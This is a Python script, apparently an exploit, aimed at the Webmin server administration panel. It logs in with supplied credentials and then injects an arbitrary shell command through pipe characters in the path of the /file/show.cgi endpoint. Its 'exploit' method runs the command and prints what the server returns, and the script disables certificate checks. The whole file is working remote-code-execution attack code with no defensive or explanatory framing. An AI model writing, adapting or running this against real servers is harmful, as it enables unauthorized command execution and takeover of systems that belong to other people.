import random
import string
import requests

class WebminExploit:
    def __init__(self, target, username, password, port=10000, use_ssl=True):
        self.target = target
        self.username = username
        self.password = password
        self.port = port
        self.use_ssl = use_ssl
        self.session = None

    def rand_text_alphanumeric(self, length):
        """Generate a random alphanumeric string of a given length."""
        letters_and_digits = string.ascii_letters + string.digits
        return ''.join(random.choice(letters_and_digits) for i in range(length))

    def authenticate(self):
        protocol = 'https' if self.use_ssl else 'http'
        url = f"{protocol}://{self.target}:{self.port}/session_login.cgi"
        data = {
            'page': '/',
            'user': self.username,
            'pass': self.password
        }
        response = requests.post(url, data=data, verify=False)
        if response.status_code == 302 and 'sid' in response.cookies:
            self.session = response.cookies['sid']
            print(f"[+] Authentication successful, SID: {self.session}")
            return True
        else:
            print("[-] Authentication failed")
            return False

    def check_vulnerability(self, command):
        if not self.authenticate():
            return False

        random_length = random.randint(5, 9)
        random_string = self.rand_text_alphanumeric(random_length)

        protocol = 'https' if self.use_ssl else 'http'
        url = f"{protocol}://{self.target}:{self.port}/file/show.cgi/bin/{self.rand_text_alphanumeric(5)}|{command}|"
        cookies = {'sid': self.session}
        response = requests.get(url, cookies=cookies, verify=False)
        if response.status_code == 200 and 'Document follows' in response.text:
            print("[+] Target is vulnerable")
            return True
        else:
            print("[-] Target is not vulnerable")
            return False

    def exploit(self, command):
        if not self.authenticate():
            return False

        random_length = random.randint(5, 9)
        #random_string = self.rand_text_alphanumeric(random_length)

        protocol = 'https' if self.use_ssl else 'http'
        url = f"{protocol}://{self.target}:{self.port}/file/show.cgi/bin/{self.rand_text_alphanumeric(5)}|{command}|"
        cookies = {'sid': self.session}
        response = requests.get(url, cookies=cookies, verify=False)
        if response.status_code == 200 and 'Document follows' in response.text:
            print("[+] Command executed successfully")
            print(response.text)
            return True
        else:
            print("[-] Command execution failed")
            return False
